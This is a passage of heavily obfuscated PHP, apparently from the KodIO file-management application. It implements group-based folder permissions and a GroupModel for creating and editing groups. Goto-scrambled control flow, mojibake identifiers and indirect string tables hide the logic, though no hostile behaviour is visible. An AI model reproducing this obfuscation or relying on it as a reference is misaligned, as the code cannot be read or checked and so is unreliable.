$CÀ¸‚Ü¸[$e”Œöª±˜[28]], $e”Œöª±˜[76] => KodIO::make($CÀ¸‚Ü¸[$e”Œöª±˜[85]][$e”Œöª±˜[404]]), $e”Œöª±˜[1890] => $CÀ¸‚Ü¸[$e”Œöª±˜[500]])); } protected function groupRootAuth($cîĞñäëë, $DÃè¡¹ = false) { goto b’Ÿñ‰Û°ã; f™œº¹ó¼²: static $dâÁá¿„İË = array(); if (isset($dâÁá¿„İË[$aâî•…áÎ¾])) { return $dâÁá¿„İË[$aâî•…áÎ¾]; } $aøªĞÒÈ†Ğ = Model($f³¥¾ƒŞË[495])->getInfo($cîĞñäëë); goto b¨ÚõÂ¹†÷; e½Šæõ·ì‹: $dâÁá¿„İË[$aâî•…áÎ¾] = $bìâ·ÔÓÆ ? $bìâ·ÔÓÆ : $bæä‹Áî½¥; return $dâÁá¿„İË[$aâî•…áÎ¾]; goto CÈ¶ÃÛÃ¾³; Eì•ˆÌ´ï½: $Eä’œè©Ì = $this->sourceAuthSelect($aøªĞÒÈ†Ğ[$f³¥¾ƒŞË[85]][$f³¥¾ƒŞË[404]]); $fŒàÖ‘óò× = $Eä’œè©Ì ? $this->authMake($Eä’œè©Ì, $DÃè¡¹) : !1; $bìâ·ÔÓÆ = $fŒàÖ‘óò× ? $fŒàÖ‘óò×[$f³¥¾ƒŞË[455]] : !1; goto e½Šæõ·ì‹; b’Ÿñ‰Û°ã: $f³¥¾ƒŞË =& $_SERVER[úÉ·öƒÑì©]; $DÃè¡¹ = $DÃè¡¹ ? $DÃè¡¹ : USER_ID; $aâî•…áÎ¾ = $DÃè¡¹ . $f³¥¾ƒŞË[1894] . $cîĞñäëë; goto f™œº¹ó¼²; b¨ÚõÂ¹†÷: $c‚ŞÇÔ‘²ô = $this->userGroupList($DÃè¡¹); $bæä‹Áî½¥ = isset($c‚ŞÇÔ‘²ô[$cîĞñäëë]) ? $c‚ŞÇÔ‘²ô[$cîĞñäëë][$f³¥¾ƒŞË[415]] : !1; if ($bæä‹Áî½¥ && Model($f³¥¾ƒŞË[1866])->authCheckAction($bæä‹Áî½¥[$f³¥¾ƒŞË[415]], $f³¥¾ƒŞË[1719])) { $dâÁá¿„İË[$aâî•…áÎ¾] = $bæä‹Áî½¥; return $bæä‹Áî½¥; } goto Eì•ˆÌ´ï½; CÈ¶ÃÛÃ¾³: } public function authOwnerApply($Fš²Åå£Ê£) { goto cêÓÜöÀ‚È; cêÓÜöÀ‚È: $b³º®ñù¡î =& $_SERVER[úÉ·öƒÑì©]; if (empty($Fš²Åå£Ê£[$b³º®ñù¡î[415]]) || isset($Fš²Åå£Ê£[$b³º®ñù¡î[1895]]) && $Fš²Åå£Ê£[$b³º®ñù¡î[1895]]) { return $Fš²Åå£Ê£; } if (AuthModel::authCheckRoot($Fš²Åå£Ê£[$b³º®ñù¡î[415]][$b³º®ñù¡î[416]])) { return $Fš²Åå£Ê£; } goto dîïÜôİÙõ; b„ß¨Ò”°²: $Fš²Åå£Ê£[$b³º®ñù¡î[415]][$b³º®ñù¡î[1897]] = Model($b³º®ñù¡î[511])->userListInfo($cÚè™»Ú™); return $Fš²Åå£Ê£; goto bƒÛ‚‘•­ß; CíÅ¹íš»: $B¶¡çÄÓ = array(); $cÚè™»Ú™ = array(); foreach ($B ËÇïè¹° as $F„Ó¨Ö„á => $C³«Ñ¨ˆ˜ß) { $Bø‘–ÛŒ = $this->authFolderOwnerUser($C³«Ñ¨ˆ˜ß); $B¶¡çÄÓ[$F„Ó¨Ö„á] = $Bø‘–ÛŒ; $cÚè™»Ú™ = array_merge($cÚè™»Ú™, $Bø‘–ÛŒ[$b³º®ñù¡î[571]]); if ($Bø‘–ÛŒ[$b³º®ñù¡î[1896]]) { break; } } goto A‹®»»ÀËŠ; dîïÜôİÙõ: $B£Šç¬¡¾´ = Model($b³º®ñù¡î[1213])->parentLevelArray($Fš²Åå£Ê£[$b³º®ñù¡î[496]]); $B£Šç¬¡¾´ = array_merge(array($Fš²Åå£Ê£[$b³º®ñù¡î[404]]), array_reverse($B£Šç¬¡¾´)); $B ËÇïè¹° = $this->sourceAuthSelect($B£Šç¬¡¾´); goto CíÅ¹íš»; A‹®»»ÀËŠ: if (count($cÚè™»Ú™) == 0) { $cÚè™»Ú™ = $this->authFolderOwnerGroup($Fš²Åå£Ê£[$b³º®ñù¡î[493]]); } $cÚè™»Ú™ = array_unique($cÚè™»Ú™); if (AuthModel::authCheckRoot($Fš²Åå£Ê£[$b³º®ñù¡î[415]][$b³º®ñù¡î[416]])) { $cÚè™»Ú™[] = USER_ID; } goto b„ß¨Ò”°²; bƒÛ‚‘•­ß: } private function authFolderOwnerGroup($D„¡š“âİÁ) { $C”ò…´”› =& $_SERVER[úÉ·öƒÑì©]; $côÕ©‚ÅÙ = Model($C”ò…´”›[1780])->where(array($C”ò…´”›[1699] => $D„¡š“âİÁ))->select(); $Eô®††Ë = array(); if (!$côÕ©‚ÅÙ) { return $Eô®††Ë; } foreach ($côÕ©‚ÅÙ as $e…®µŒ²÷) { $BÍâ÷ÔŒ‡î = $this->authInfo($e…®µŒ²÷); if (AuthModel::authCheckRoot($BÍâ÷ÔŒ‡î[$C”ò…´”›[415]])) { $Eô®††Ë[] = $e…®µŒ²÷[$C”ò…´”›[1535]]; } } return $Eô®††Ë; } private function authFolderOwnerUser($e×´‡¶Î™) { $D»Öªó»¥ª =& $_SERVER[úÉ·öƒÑì©]; $bÉÚÔÕ¡ó’ = array(); $A”’¢Ê¼…Š = !1; foreach ($e×´‡¶Î™ as $Eäí‰ ˜››) { $dì¤Îºî–Ö = $this->authInfo($Eäí‰ ˜››); if ($Eäí‰ ˜››[$D»Öªó»¥ª[493]] == $D»Öªó»¥ª[191]) { $A”’¢Ê¼…Š = !0; } if ($Eäí‰ ˜››[$D»Öªó»¥ª[413]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($dì¤Îºî–Ö[$D»Öªó»¥ª[415]])) { $bÉÚÔÕ¡ó’[] = $Eäí‰ ˜››[$D»Öªó»¥ª[493]]; } } } return array($D»Öªó»¥ª[571] => $bÉÚÔÕ¡ó’, $D»Öªó»¥ª[1896] => $A”’¢Ê¼…Š); } public function authMake($FªîõôĞÍŒ, $A®Ø¯¢ÉáŠ = false) { $e¾¦—¹°…Ñ =& $_SERVER[úÉ·öƒÑì©]; $A²ÃÚã„ƒ¯ = $this->authArrayCheck($FªîõôĞÍŒ, $A®Ø¯¢ÉáŠ); if ($A²ÃÚã„ƒ¯[$e¾¦—¹°…Ñ[1898]]) { $A²ÃÚã„ƒ¯[$e¾¦—¹°…Ñ[1898]] = $this->sourceAuthInfo($A²ÃÚã„ƒ¯[$e¾¦—¹°…Ñ[1898]]); } return $A²ÃÚã„ƒ¯; } public function authArrayCheck($a‘òöÕñ¥á, $e™ã×”×¤ = false) { goto C…×ëÌ§œÕ; c¿õÄŒéÇø: foreach ($a‘òöÕñ¥á as $C˜Œõ—ø±Ò) { $FÆ«Î§«ÇÄ = $this->authInfo($C˜Œõ—ø±Ò); if (!$FÆ«Î§«ÇÄ) { continue; } $cÙ£àÊİ¥ = $C˜Œõ—ø±Ò[$c…ñ·«Âäˆ[493]]; $cƒô˜ˆ…èé = intval($FÆ«Î§«ÇÄ[$c…ñ·«Âäˆ[415]]); if ($C˜Œõ—ø±Ò[$c…ñ·«Âäˆ[413]] == SourceModel::TYPE_USER && $cÙ£àÊİ¥ == $e™ã×”×¤) { $b¥â«±ì¯ = !0; $bÍ”Ş¾·„ = $FÆ«Î§«ÇÄ; $b¤°ù‹ÈÖ = $cƒô˜ˆ…èé; } else { if ($C˜Œõ—ø±Ò[$c…ñ·«Âäˆ[413]] == SourceModel::TYPE_GROUP && $this->groupContainUser($cÙ£àÊİ¥, $e™ã×”×¤)) { $CÜ·³â„ö˜ = !0; $e¢·¤ÒàÚù = $this->groupStepToUserGroup($cÙ£àÊİ¥, $e™ã×”×¤); if ($e¢·¤ÒàÚù < $AÀåØÑ²ƒ†) { $AÀåØÑ²ƒ† = $e¢·¤ÒàÚù; $Dèˆ†öÛ = $cƒô˜ˆ…èé; $D‘¿‘‡æê˜ = $FÆ«Î§«ÇÄ; $Aæ‘óÃš ‘ = $cÙ£àÊİ¥; } if ($e¢·¤ÒàÚù == $AÀåØÑ²ƒ† && $cƒô˜ˆ…èé >= $Dèˆ†öÛ) { $Dèˆ†öÛ = $cƒô˜ˆ…èé; $D‘¿‘‡æê˜ = $FÆ«Î§«ÇÄ; $Aæ‘óÃš ‘ = $cÙ£àÊİ¥; } } else { if ($cÙ£àÊİ¥ == $c…ñ·«Âäˆ[191]) { $dŠÕ™…µ® = !0; $dì„Ê¸„Š = $FÆ«Î§«ÇÄ; $c‘ ÜÀ¤ƒé = $cƒô˜ˆ…èé; } } } } if ($b¥â«±ì¯) { $eä½‚†£“Á = $b¤°ù‹ÈÖ; $FÆ«Î§«ÇÄ = $bÍ”Ş¾·„; $c¾Ïì«Û = LNG($c…ñ·«Âäˆ[1899]); } else { if ($CÜ·³â„ö˜) { $eä½‚†£“Á = $Dèˆ†öÛ; $FÆ«Î§«ÇÄ = $D‘¿‘‡æê˜; $fËİáïšÒ† = Model($c…ñ·«Âäˆ[495])->getInfo($Aæ‘óÃš ‘); $c¾Ïì«Û = $c…ñ·«Âäˆ[160] . $fËİáïšÒ†[$c…ñ·«Âäˆ[500]] . $c…ñ·«Âäˆ[1900] . LNG($c…ñ·«Âäˆ[1901]); } else { if ($dŠÕ™…µ®) { $eä½‚†£“Á = $c‘ ÜÀ¤ƒé; $FÆ«Î§«ÇÄ = $dì„Ê¸„Š; $c¾Ïì«Û = LNG($c…ñ·«Âäˆ[1872]); } else { $eä½‚†£“Á = 0; $FÆ«Î§«ÇÄ = !1; $c¾Ïì«Û = $c…ñ·«Âäˆ[33]; } } } $aÂ‘Ñ…‡Ë = array($c…ñ·«Âäˆ[1891] => intval($eä½‚†£“Á), $c…ñ·«Âäˆ[1875] => $FÆ«Î§«ÇÄ, $c…ñ·«Âäˆ[1892] => $c¾Ïì«Û, $c…ñ·«Âäˆ[1884] => $C˜Œõ—ø±Ò[$c…ñ·«Âäˆ[404]]); goto E¾ïöè¡Ò‚; d¨ƒ­Ö¾Ã©: $AÀåØÑ²ƒ† = 1000; $Aæ‘óÃš ‘ = 0; $dŠÕ™…µ® = 0; goto b„ä¯ÎÄ‘Ô; b„ä¯ÎÄ‘Ô: $c‘ ÜÀ¤ƒé = 0; $dì„Ê¸„Š = 0; $C˜Œõ—ø±Ò = array($c…ñ·«Âäˆ[404] => 0); goto c¿õÄŒéÇø; CÈÇÈ—„É: $b¥â«±ì¯ = 0; $b¤°ù‹ÈÖ = 0; $bÍ”Ş¾·„ = 0; goto d›ŒòôÃ‡×; C…×ëÌ§œÕ: $c…ñ·«Âäˆ =& $_SERVER[úÉ·öƒÑì©]; if (!$a‘òöÕñ¥á) { return array($c…ñ·«Âäˆ[416] => 0, $c…ñ·«Âäˆ[455] => !1); } $e™ã×”×¤ = $e™ã×”×¤ ? $e™ã×”×¤ : USER_ID; goto CÈÇÈ—„É; E¾ïöè¡Ò‚: return $aÂ‘Ñ…‡Ë; goto a¢öÖÄ¼îè; d›ŒòôÃ‡×: $CÜ·³â„ö˜ = 0; $Dèˆ†öÛ = 0; $D‘¿‘‡æê˜ = 0; goto d¨ƒ­Ö¾Ã©; a¢öÖÄ¼îè: } private function groupContainUser($aÀÎ¹²³÷Ô, $D¤×ˆ…ÌÀ = false) { return in_array($aÀÎ¹²³÷Ô, $this->userGroupParents($D¤×ˆ…ÌÀ)); } private function groupStepToUserGroup($Eâïµ¢Â«ƒ, $BÚ­’áŠ·ï = false) { goto FµÇ‘’Éƒ‹; FµÇ‘’Éƒ‹: $d²é¡ô¢¦ =& $_SERVER[úÉ·öƒÑì©]; $fá¤‹ÏÊ¤± = $this->userGroupList($BÚ­’áŠ·ï); $F«Ÿ²¤…áÆ = 1000; goto E«ß¤³öÆã; E«ß¤³öÆã: $BÚ¼øÑ§Üç = $GLOBALS[$d²é¡ô¢¦[6]][$d²é¡ô¢¦[88]][$d²é¡ô¢¦[1791]] == 1; $Cñí·ßŠÄ = $BÚ¼øÑ§Üç ? 3 : 2; foreach ($fá¤‹ÏÊ¤± as $dèˆÏƒöœ) { if ($dèˆÏƒöœ[$d²é¡ô¢¦[1699]] == $Eâïµ¢Â«ƒ) { return 0; } $b÷Ïòå®Çß = explode($d²é¡ô¢¦[47], trim($dèˆÏƒöœ[$d²é¡ô¢¦[496]], $d²é¡ô¢¦[47])); if ($b÷Ïòå®Çß[0] == $d²é¡ô¢¦[191] && count($b÷Ïòå®Çß) > $Cñí·ßŠÄ) { $Cå£ÒŠÑ·Ô = array_reverse(array_slice($b÷Ïòå®Çß, $Cñí·ßŠÄ)); $a‰ßº‹Ò® = array_search($Eâïµ¢Â«ƒ, $Cå£ÒŠÑ·Ô); if ($a‰ßº‹Ò® !== !1 && $a‰ßº‹Ò® + 1 <= $F«Ÿ²¤…áÆ) { $F«Ÿ²¤…áÆ = $a‰ßº‹Ò® + 1; } } } goto DÓêƒ–©; DÓêƒ–©: return $F«Ÿ²¤…áÆ; goto CÆğÕˆÜßÈ; CÆğÕˆÜßÈ: } private function userGroupList($F—ïá§ôñÁ = false) { $d¢ÊİÁå‡ =& $_SERVER[úÉ·öƒÑì©]; static $c¡Û²˜¸¶ = array(); if (isset($c¡Û²˜¸¶[$F—ïá§ôñÁ])) { return $c¡Û²˜¸¶[$F—ïá§ôñÁ]; } $C·Ô‚í«§ = Model($d¢ÊİÁå‡[515])->getInfo($F—ïá§ôñÁ); $c¡Û²˜¸¶[$F—ïá§ôñÁ] = array_to_keyvalue($C·Ô‚í«§[$d¢ÊİÁå‡[1873]], $d¢ÊİÁå‡[1699]); return $c¡Û²˜¸¶[$F—ïá§ôñÁ]; } public function userGroupParents($eôŒë—‘º—) { goto F–„¥¬…«ê; e®¨·óèÜ: if (isset($aæÇ·Ø–ß[$eôŒë—‘º—])) { return $aæÇ·Ø–ß[$eôŒë—‘º—]; } $fĞğ•Àñµ = $this->userGroupList($eôŒë—‘º—); $eÅ‚²íª± = array(); goto EÁÀõæ¸ÏÊ; D¨Üª–àøë: $aæÇ·Ø–ß[$eôŒë—‘º—] = array_unique($eÅ‚²íª±); return $aæÇ·Ø–ß[$eôŒë—‘º—]; goto D‚Ïİ¶¥±ä; EÁÀõæ¸ÏÊ: $AÓ‡Õ‚†Ñ¿ = $GLOBALS[$fÕÉ¡ÏÎ ‰[6]][$fÕÉ¡ÏÎ ‰[88]][$fÕÉ¡ÏÎ ‰[1791]] == 1; $CğµæŠóñÅ = $AÓ‡Õ‚†Ñ¿ ? 3 : 2; foreach ($fĞğ•Àñµ as $Dˆ­ÜÖà‚) { $c‚¸¬Š·³› = array($Dˆ­ÜÖà‚[$fÕÉ¡ÏÎ ‰[1699]]); $D ¶®âäÍ‘ = explode($fÕÉ¡ÏÎ ‰[47], trim($Dˆ­ÜÖà‚[$fÕÉ¡ÏÎ ‰[496]], $fÕÉ¡ÏÎ ‰[47])); if ($D ¶®âäÍ‘[0] == $fÕÉ¡ÏÎ ‰[191] && count($D ¶®âäÍ‘) > $CğµæŠóñÅ) { $cÖ±ãƒ‹Ç¿ = array_slice($D ¶®âäÍ‘, $CğµæŠóñÅ); $c‚¸¬Š·³› = array_merge($c‚¸¬Š·³›, array_reverse($cÖ±ãƒ‹Ç¿)); } $eÅ‚²íª± = array_merge($eÅ‚²íª±, $c‚¸¬Š·³›); } goto D¨Üª–àøë; F–„¥¬…«ê: $fÕÉ¡ÏÎ ‰ =& $_SERVER[úÉ·öƒÑì©]; static $aæÇ·Ø–ß = array(); $eôŒë—‘º— = $eôŒë—‘º— ? $eôŒë—‘º— : USER_ID; goto e®¨·óèÜ; D‚Ïİ¶¥±ä: } public function authTargetInfoMake($d§â¼™òÂ) { goto cï¾Â°èé‰; d ½Ô†ãã: return array($eŒŞãç±»[1903] => $c°ÛõæªÖè, $eŒŞãç±»[1904] => $Bö®™ˆçÀ); goto E‰Úå²áÙ; eªÆÖ¦ñ: foreach ($d§â¼™òÂ as $D××æ•¾Ãê) { if ($D××æ•¾Ãê[$eŒŞãç±»[413]] == SourceModel::TYPE_USER) { $c°ÛõæªÖè[] = intval($D××æ•¾Ãê[$eŒŞãç±»[493]]); } else { if ($D××æ•¾Ãê[$eŒŞãç±»[413]] == SourceModel::TYPE_GROUP) { $Bö®™ˆçÀ[] = intval($D××æ•¾Ãê[$eŒŞãç±»[493]]); } } } if ($c°ÛõæªÖè) { $c°ÛõæªÖè = Model($eŒŞãç±»[511])->userListInfo($c°ÛõæªÖè); } if ($Bö®™ˆçÀ) { $EÆ†æŸ‰âÃ = array($eŒŞãç±»[1777] => array($eŒŞãç±»[420], $Bö®™ˆçÀ)); $Bö®™ˆçÀ = Model($eŒŞãç±»[495])->field($eŒŞãç±»[1902])->where($EÆ†æŸ‰âÃ)->select(); $Bö®™ˆçÀ = array_to_keyvalue($Bö®™ˆçÀ, $eŒŞãç±»[1699]); } goto d ½Ô†ãã; cï¾Â°èé‰: $eŒŞãç±» =& $_SERVER[úÉ·öƒÑì©]; $c°ÛõæªÖè = array(); $Bö®™ˆçÀ = array(); goto eªÆÖ¦ñ; E‰Úå²áÙ: } public function authInfo($B÷ÚÆö–) { $Fâ©¡åáÖ‚ =& $_SERVER[úÉ·öƒÑì©]; if ($B÷ÚÆö–[$Fâ©¡åáÖ‚[1794]]) { $b…¾ÉÂà‘À = Model($Fâ©¡åáÖ‚[1866])->listData($B÷ÚÆö–[$Fâ©¡åáÖ‚[1794]]); if (!$b…¾ÉÂà‘À) { return !1; $Fç«ŠòµÙÈ = Model($Fâ©¡åáÖ‚[1866])->listData(); $c¹‹ÙƒÂ’õ = array_filter_by_field($Fç«ŠòµÙÈ, $Fâ©¡åáÖ‚[415], $Fâ©¡åáÖ‚[191]); return $c¹‹ÙƒÂ’õ; } $bÙÂß—„† = array_field_key($b…¾ÉÂà‘À, array($Fâ©¡åáÖ‚[402], $Fâ©¡åáÖ‚[28], $Fâ©¡åáÖ‚[415], $Fâ©¡åáÖ‚[1720], $Fâ©¡åáÖ‚[1722])); $bÙÂß—„†[$Fâ©¡åáÖ‚[1905]] = $B÷ÚÆö–; return $bÙÂß—„†; } else { return array($Fâ©¡åáÖ‚[421] => 0, $Fâ©¡åáÖ‚[1705] => $B÷ÚÆö–[$Fâ©¡åáÖ‚[1848]], $Fâ©¡åáÖ‚[422] => $Fâ©¡åáÖ‚[33], $Fâ©¡åáÖ‚[1720] => $Fâ©¡åáÖ‚[1906]); } } } goto d¬ñî¾ğÌĞ; d¿œŸÚÀ¹å: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\160"; protected $tableMeta = array("\164\141\142\x6c\145\116\x61\x6d\145" => "\x67\162\x6f\x75\x70\137\x6d\145\x74\141", "\x6d\x65\x74\141\106\151\x65\x6c\144" => "\147\x72\157\x75\x70\111\x44"); protected function cacheFunctionAlias($e£½ë»ƒ¸) { $dóôÙğƒòÓ =& $_SERVER[úÉ·öƒÑì©]; return array($dóôÙğƒòÓ[1769] => array($e£½ë»ƒ¸[0], $dóôÙğƒòÓ[1770]), $dóôÙğƒòÓ[1771] => array($e£½ë»ƒ¸[0], $dóôÙğƒòÓ[1770])); } protected function getInfo($D‘íÓÉÖ­) { $d ó‡ó”Ò˜ = $this->getInfoSimple($D‘íÓÉÖ­); if (!$d ó‡ó”Ò˜) { return !1; } return $this->_listDataApplyItem($d ó‡ó”Ò˜); } protected function getInfoSimple($bŠÏÉ›†“†, $bÇÔæ„š™¨ = false) { $e¿ùÔóƒ¹ã =& $_SERVER[úÉ·öƒÑì©]; if ($bÇÔæ„š™¨) { $cÉ˜ù„Ç ñ = array($e¿ùÔóƒ¹ã[1699] => intval($bŠÏÉ›†“†)); $a —Ô ®Û½ = $this->where($cÉ˜ù„Ç ñ)->find(); return is_array($a —Ô ®Û½) ? $a —Ô ®Û½ : array(); } return $this->cacheFunctionGet($e¿ùÔóƒ¹ã[1772], $bŠÏÉ›†“†); } protected function groupAdd($b÷§ÜÍÄ§ê) { goto aˆ† Êâ§­; aˆ† Êâ§­: $CïµÉí¦Òğ =& $_SERVER[úÉ·öƒÑì©]; if (!$b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[487]] && isset($b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1699]]) && $b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1699]] == 1) { if ($e®¯æÉ” = $this->getInfoSimple($b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1699]], !0)) { return $b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1699]]; } } else { $e®¯æÉ” = $this->getInfoSimple($b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[487]]); if (!$e®¯æÉ”) { return !1; } } $c¤šÂ…‘¸¿ = $CïµÉí¦Òğ[507]; goto FĞõåÄ¯’ß; eËŠÑÂãƒˆ: if (isset($b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1775]])) { $this->metaSet($a±óÖŒíŠ¼, array($CïµÉí¦Òğ[1775] => $b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1775]], $CïµÉí¦Òğ[1776] => $b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1776]])); unset($b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1775]]); unset($b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1776]]); } Model($CïµÉí¦Òğ[1213])->groupRootAdd($a±óÖŒíŠ¼); return $a±óÖŒíŠ¼; goto b‰¼ˆ¼Ğ; A«ª–‡í«Œ: if (!empty($b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1699]])) { $d‚Î†Õ¢Ì[$CïµÉí¦Òğ[1699]] = $b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1699]]; } $a±óÖŒíŠ¼ = $this->add($d‚Î†Õ¢Ì); $this->setNamePinyin($a±óÖŒíŠ¼, $d‚Î†Õ¢Ì[$CïµÉí¦Òğ[28]]); goto eËŠÑÂãƒˆ; FĞõåÄ¯’ß: if ($e®¯æÉ”[$CïµÉí¦Òğ[496]]) { $c¤šÂ…‘¸¿ = $e®¯æÉ”[$CïµÉí¦Òğ[496]] . $e®¯æÉ”[$CïµÉí¦Òğ[1699]] . $CïµÉí¦Òğ[47]; } $d‚Î†Õ¢Ì = array($CïµÉí¦Òğ[422] => $this->groupNameAuto($b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[487]], $b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[28]]), $CïµÉí¦Òğ[403] => $b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[487]], $CïµÉí¦Òğ[562] => $c¤šÂ…‘¸¿, $CïµÉí¦Òğ[1773] => $b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1683]], $CïµÉí¦Òğ[1774] => 0, $CïµÉí¦Òğ[1703] => 0); if (isset($b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1722]])) { $d‚Î†Õ¢Ì[$CïµÉí¦Òğ[1722]] = $b÷§ÜÍÄ§ê[$CïµÉí¦Òğ[1722]]; } else { $dØáÄÙ÷Ÿó = $this->max($CïµÉí¦Òğ[1722]); if (!$dØáÄÙ÷Ÿó) { $dØáÄÙ÷Ÿó = 0; } $d‚Î†Õ¢Ì[$CïµÉí¦Òğ[1722]] = $dØáÄÙ÷Ÿó + 1; } goto A«ª–‡í«Œ; b‰¼ˆ¼Ğ: } protected function groupEdit($fñÈŞÔ¦µ¤, $f©¥³åĞÓ) { goto aœÎòÏ½Ì; b‹»÷¯ˆ¸Á: if (!empty($f©¥³åĞÓ[$e¡‡¼åÙ»[487]])) { $Bï¸‡”èÅà = $this->getInfoSimple($f©¥³åĞÓ[$e¡‡¼åÙ»[487]]); if (!$Bï¸‡”èÅà) { return !1; } if ($Aªù˜ÉùŞ[$e¡‡¼åÙ»[1699]] == $Bï¸‡”èÅà[$e¡‡¼åÙ»[1699]]) { return !1; } if ($f©¥³åĞÓ[$e¡‡¼åÙ»[487]] != $Aªù˜ÉùŞ[$e¡‡¼åÙ»[487]]) { if ($Bï¸‡”èÅà[$e¡‡¼åÙ»[496]] !== $Aªù˜ÉùŞ[$e¡‡¼åÙ»[496]] && strpos($Bï¸‡”èÅà[$e¡‡¼åÙ»[496]], $Aªù˜ÉùŞ[$e¡‡¼åÙ»[496]] . $Aªù˜ÉùŞ[$e¡‡¼åÙ»[1699]] . $e¡‡¼åÙ»[47]) === 0) { return !1; } $f©¥³åĞÓ[$e¡‡¼åÙ»[562]] = $Bï¸‡”èÅà[$e¡‡¼åÙ»[496]] . $f©¥³åĞÓ[$e¡‡¼åÙ»[487]] . $e¡‡¼åÙ»[47]; $this->_changeChildLevel($Aªù˜ÉùŞ, $Bï¸‡”èÅà); } } if (isset($f©¥³åĞÓ[$e¡‡¼åÙ»[28]])) { $this->setNamePinyin($fñÈŞÔ¦µ¤, $f©¥³åĞÓ[$e¡‡¼åÙ»[28]]); } if (isset($f©¥³åĞÓ[$e¡‡¼åÙ»[1775]])) { $this->metaSet($fñÈŞÔ¦µ¤, array($e¡‡¼åÙ»[1775] => $f©¥³åĞÓ[$e¡‡¼åÙ»[1775]], $e¡‡¼åÙ»[1776] => $f©¥³åĞÓ[$e¡‡¼åÙ»[1776]])); unset($f©¥³åĞÓ[$e¡‡¼åÙ»[1775]]); unset($f©¥³åĞÓ[$e¡‡¼åÙ»[1776]]); } goto aÀ¬ßŠ£Şæ; aÀ¬ßŠ£Şæ: if (isset($f©¥³åĞÓ[$e¡‡¼åÙ»[28]]) && $f©¥³åĞÓ[$e¡‡¼åÙ»[28]] != $Aªù˜ÉùŞ[$e¡‡¼åÙ»[28]]) { $this->_clearChildrenCache($Aªù˜ÉùŞ); } return $this->where(array($e¡‡¼åÙ»[1777] => $fñÈŞÔ¦µ¤))->save($f©¥³åĞÓ); goto c ¡Çáê¢Œ; aœÎòÏ½Ì: $e¡‡¼åÙ» =& $_SERVER[úÉ·öƒÑì©]; $Aªù˜ÉùŞ = $this->getInfoSimple($fñÈŞÔ¦µ¤); if (!$Aªù˜ÉùŞ) { return !1; } goto b‹»÷¯ˆ¸Á; c ¡Çáê¢Œ: } private function _clearChildrenCache($EŸ¬¹Üˆğ†) { $e…šØóƒ‹  =& $_SERVER[úÉ·öƒÑì©]; $dôöèì÷Ò’ = array($e…šØóƒ‹ [562] => array($e…šØóƒ‹ [521], $EŸ¬¹Üˆğ†[$e…šØóƒ‹ [496]] . $EŸ¬¹Üˆğ†[$e…šØóƒ‹ [1699]] . $e…šØóƒ‹ [522])); $EíŠ¤íéæ× = $this->field($e…šØóƒ‹ [1699])->where($dôöèì÷Ò’)->select(); foreach ($EíŠ¤íéæ× as $dÈÕÚºœ‹Œ) { $this->cacheFunctionClear($e…šØóƒ‹ [1778], $dÈÕÚºœ‹Œ[$e…šØóƒ‹ [1699]]); $this->cacheFunctionClear($e…šØóƒ‹ [1772], $dÈÕÚºœ‹Œ[$e…šØóƒ‹ [1699]]); } } private function _changeChildLevel($bèØÛê‹ÁÆ, $A¹‹À®ˆÈ‡, $dª—ÄŒÚì÷ = false) { goto Fô¨¶Ø¤; fë–â·­çˆ: $this->_clearChildrenCache($bèØÛê‹ÁÆ); $this->where($A—öˆİÑ§¦)->data($d±ô—‡æğ)->save(); goto Eá¼ñ‚¬¹; Fô¨¶Ø¤: $EÚè¦ºè× =& $_SERVER[úÉ·öƒÑì©]; $B³‰âˆ•çœ = $bèØÛê‹ÁÆ[$EÚè¦ºè×[496]] . $bèØÛê‹ÁÆ[$EÚè¦ºè×[1699]] . $EÚè¦ºè×[47]; $bÕ…ºö·ó÷ = $A¹‹À®ˆÈ‡[$EÚè¦ºè×[496]] . $A¹‹À®ˆÈ‡[$EÚè¦ºè×[1699]] . $EÚè¦ºè×[47] . $bèØÛê‹ÁÆ[$EÚè¦ºè×[1699]] . $EÚè¦ºè×[47]; goto b‰©ó†ôÆ™; b‰©ó†ôÆ™: if ($dª—ÄŒÚì÷) { $bÕ…ºö·ó÷ = $A¹‹À®ˆÈ‡[$EÚè¦ºè×[496]] . $A¹‹À®ˆÈ‡[$EÚè¦ºè×[1699]] . $EÚè¦ºè×[47]; } $A—öˆİÑ§¦ = array($EÚè¦ºè×[562] => array($EÚè¦ºè×[521], $bèØÛê‹ÁÆ[$EÚè¦ºè×[496]] . $bèØÛê‹ÁÆ[$EÚè¦ºè×[1699]] . $EÚè¦ºè×[522])); $d±ô—‡æğ = array($EÚè¦ºè×[562] => array($EÚè¦ºè×[570], "\x72\x65\x70\x6c\x61\x63\145\50\160\x61\162\x65\x6e\x74\114\x65\x76\x65\154\54\47{$B³‰âˆ•çœ}\x27\54\47{$bÕ…ºö·ó÷}\x27\51")); goto fë–â·­çˆ; Eá¼ñ‚¬¹: } public function setNamePinyin($Dè®¾Ô‹¼â, $BèŸ¾¤Á = false) { $fò×­É¤´ù =& $_SERVER[úÉ·öƒÑì©]; if (!$BèŸ¾¤Á) { $eíœ…Ë¤«‹ = $this->getInfoSimple($Dè®¾Ô‹¼â); $BèŸ¾¤Á = $eíœ…Ë¤«‹[$fò×­É¤´ù[28]]; } if (!Input::check($BèŸ¾¤Á, $fò×­É¤´ù[565])) { $this->metaSet($Dè®¾Ô‹¼â, $fò×­É¤´ù[453], null); $this->metaSet($Dè®¾Ô‹¼â, $fò×­É¤´ù[452], null); return; } $D•œçÖÕ… = array($fò×­É¤´ù[453] => str_replace($fò×­É¤´ù[50], $fò×­É¤´ù[33], Pinyin::encode($BèŸ¾¤Á)), $fò×­É¤´ù[452] => 